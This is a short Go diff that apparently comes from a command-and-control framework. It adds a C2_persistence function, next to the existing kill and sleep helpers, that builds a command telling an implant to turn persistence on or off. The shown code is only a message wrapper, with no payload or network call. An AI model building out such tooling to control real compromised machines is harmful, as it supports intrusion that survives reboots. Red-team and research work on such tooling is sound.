@@ -64,3 +64,7 @@ func C2_kill() *CheckCmdReply {
 func C2_sleep(time int64) *CheckCmdReply {
 	return C2_wrap(&CheckCmdReply_Sleep{Sleep: time})
 }
+
+func C2_persistence(status bool) *CheckCmdReply {
+	return C2_wrap(&CheckCmdReply_Persistence{Enable: status})
+}
